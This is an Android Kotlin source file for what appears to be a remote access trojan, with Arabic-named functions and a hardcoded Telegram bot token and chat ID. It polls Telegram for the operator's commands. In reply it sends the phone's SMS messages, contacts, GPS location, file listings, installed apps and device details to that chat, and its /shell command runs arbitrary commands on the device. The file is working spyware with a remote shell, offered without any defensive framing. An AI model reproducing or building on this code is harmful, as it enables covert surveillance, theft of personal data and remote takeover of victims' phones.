package com.spud.ratc2

import android.annotation.SuppressLint
import android.content.Context
import android.location.LocationManager
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.provider.ContactsContract
import android.provider.Telephony
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder

class MainActivity : AppCompatActivity() {

    private val BOT = "8873170295:AAHX-1ddnEn3iBzwcWRFHyABrbzRV0xUCMU"
    private val MY_CHAT = "8868615222"
    private val BASE = "https://api.telegram.org/bot$BOT"

    private lateinit var logView: TextView
    @Volatile private var offset = 0L

    override fun onCreate(s: Bundle?) {
        super.onCreate(s)
        logView = TextView(this)
        logView.textSize = 13f
        logView.setPadding(20, 20, 20, 20)
        setContentView(logView)
        log("بدأ")
        Thread { حلقة() }.start()
    }

    private fun log(m: String) = runOnUiThread { logView.append("\n$m") }

    private fun حلقة() {
        while (true) {
            try { دورة() } catch (e: Exception) {
                log("خطأ: ${e.message}"); Thread.sleep(3000)
            }
        }
    }

    private fun دورة() {
        val body = طلب_جلب("$BASE/getUpdates?offset=$offset&timeout=25")
        val root = JSONObject(body)
        if (!root.optBoolean("ok")) return
        val arr = root.optJSONArray("result") ?: return
        for (i in 0 until arr.length()) {
            val upd = arr.getJSONObject(i)
            offset = upd.getLong("update_id") + 1
            val cb = upd.optJSONObject("callback_query")
            if (cb != null) {
                val chatId = cb.getJSONObject("message").getJSONObject("chat").getString("id")
                val data = cb.optString("data", "")
                val cbId = cb.getString("id")
                log("زر: $data")
                رد_على_الزر(cbId)
                if (chatId == MY_CHAT) معالج_الأزرار(chatId, data)
                continue
            }
            val msg = upd.optJSONObject("message") ?: continue
            val chatId = msg.getJSONObject("chat").getString("id")
            val text = msg.optString("text", "")
            if (text.isBlank()) continue
            log("رسالة: $chatId -> $text")
            if (chatId == MY_CHAT) معالج_النص(chatId, text)
        }
    }

    private fun معالج_النص(chatId: String, text: String) {
        when {
            text.startsWith("/start") || text.startsWith("/help") ->
                إرسال_لوحة(chatId, "اختر من الأزرار تحت:")
            text.startsWith("/ping") -> إرسال(chatId, "pong ✓")
            text.startsWith("/shell ") -> إرسال(chatId, تنفيذ_شل(text.removePrefix("/shell ")))
            else -> إرسال(chatId, "اكتب /start للأزرار")
        }
    }

    private fun معالج_الأزرار(chatId: String, data: String) {
        val رد = when (data) {
            "device"   -> معلومات_الجهاز()
            "battery"  -> معلومات_البطارية()
            "location" -> معلومات_الموقع()
            "sms"      -> قائمة_الرسائل()
            "contacts" -> قائمة_الجهات()
            "files"    -> قائمة_الملفات("/sdcard")
            "apps"     -> قائمة_التطبيقات()
            "shell"    -> "اكتب: /shell <الأمر>"
            "help"     -> "الأزرار تحت، اضغط أي واحد"
            else       -> "زر غير معروف: $data"
        }
        إرسال(chatId, رد)
        إرسال_لوحة(chatId, "")
    }

    private fun معلومات_الجهاز() = """
        📱 الشركة: ${Build.MANUFACTURER}
        📱 الموديل: ${Build.MODEL}
        🤖 أندرويد: ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})
        🔧 الاسم الداخلي: ${Build.DEVICE}
    """.trimIndent()

    private fun معلومات_البطارية(): String {
        val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val pct = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        return "🔋 البطارية: $pct%"
    }

    @SuppressLint("MissingPermission")
    private fun معلومات_الموقع(): String {
        val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        for (p in listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)) {
            lm.getLastKnownLocation(p)?.let {
                return "📍 خط العرض: ${it.latitude}\n📍 خط الطول: ${it.longitude}\n🎯 الدقة: ${it.accuracy} متر"
            }
        }
        return "📍 ما لقيت موقع محفوظ. افتح تطبيق الخرائط مرة وشغّل GPS."
    }

    private fun قائمة_الرسائل(): String {
        val sb = StringBuilder("💬 آخر 10 رسائل:\n")
        val c = contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY),
            null, null, "${Telephony.Sms.DATE} DESC"
        ) ?: return "❌ ما عندي صلاحية الرسائل"
        c.use {
            var i = 0
            while (it.moveToNext() && i < 10) {
                sb.append("📩 ${it.getString(0)}: ${it.getString(1)?.take(60)}\n"); i++
            }
        }
        return sb.toString().take(3800)
    }

    private fun قائمة_الجهات(): String {
        val sb = StringBuilder("👥 جهات الاتصال:\n")
        val c = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER),
            null, null, null) ?: return "❌ ما عندي صلاحية جهات الاتصال"
        c.use {
            var i = 0
            while (it.moveToNext() && i < 20) {
                sb.append("👤 ${it.getString(0)} | ${it.getString(1)}\n"); i++
            }
        }
        return sb.toString().take(3800)
    }

    private fun قائمة_الملفات(path: String): String {
        val f = File(path)
        if (!f.exists()) return "❌ ما لقيت: $path"
        val sb = StringBuilder("📂 محتوى $path:\n")
        f.listFiles()?.take(30)?.forEach {
            sb.append((if (it.isDirectory) "📁 " else "📄 ") + it.name + "\n")
        }
        return sb.toString().take(3800)
    }

    private fun قائمة_التطبيقات(): String {
        val sb = StringBuilder("📦 التطبيقات المثبتة:\n")
        packageManager.getInstalledPackages(0).take(30).forEach {
            sb.append("▪️ ${it.packageName}\n")
        }
        return sb.toString().take(3800)
    }

    private fun تنفيذ_شل(cmd: String): String = try {
        val p = ProcessBuilder("sh", "-c", cmd)
            .redirectErrorStream(true).start()
        val out = p.inputStream.bufferedReader().readText()
        p.waitFor()
        out.take(2000).ifBlank { "(مافي ناتج)" }
    } catch (e: Exception) { "خطأ: ${e.message}" }

    private fun إرسال(chatId: String, text: String) {
        try {
            val params = "chat_id=$chatId&text=" + URLEncoder.encode(text, "UTF-8")
            طلب_إرسال("$BASE/sendMessage", params)
        } catch (e: Exception) { log("خطأ إرسال: ${e.message}") }
    }

    private fun إرسال_لوحة(chatId: String, caption: String) {
        val لوحة = JSONArray().apply {
            put(JSONArray().put(زر("📱 معلومات الجهاز", "device")))
            put(JSONArray().apply {
                put(زر("🔋 البطارية", "battery")); put(زر("📍 الموقع", "location"))
            })
            put(JSONArray().apply {
                put(زر("💬 الرسائل", "sms")); put(زر("👥 جهات الاتصال", "contacts"))
            })
            put(JSONArray().apply {
                put(زر("📂 الملفات", "files")); put(زر("📦 التطبيقات", "apps"))
            })
            put(JSONArray().apply {
                put(زر("🐚 تنفيذ أمر", "shell")); put(زر("❓ مساعدة", "help"))
            })
        }
        val markup = JSONObject().put("inline_keyboard", لوحة)
        val text = caption.ifBlank { "🎛️ لوحة التحكم\nاختر من الأزرار:" }
        val params = "chat_id=$chatId&text=" + URLEncoder.encode(text, "UTF-8") +
                "&reply_markup=" + URLEncoder.encode(markup.toString(), "UTF-8")
        try { طلب_إرسال("$BASE/sendMessage", params) } catch (e: Exception) { log("خطأ لوحة: ${e.message}") }
    }

    private fun زر(text: String, data: String): JSONObject =
        JSONObject().put("text", text).put("callback_data", data)

    private fun رد_على_الزر(id: String) {
        try { طلب_إرسال("$BASE/answerCallbackQuery", "callback_query_id=$id") } catch (_: Exception) {}
    }

    private fun طلب_جلب(url: String): String {
        val c = URL(url).openConnection() as HttpURLConnection
        c.connectTimeout = 15000; c.readTimeout = 35000
        return c.inputStream.bufferedReader().readText()
    }

    private fun طلب_إرسال(url: String, params: String): String {
        val c = URL(url).openConnection() as HttpURLConnection
        c.connectTimeout = 15000; c.readTimeout = 35000
        c.requestMethod = "POST"; c.doOutput = true
        c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
        c.outputStream.write(params.toByteArray())
        return c.inputStream.bufferedReader().readText()
    }
}
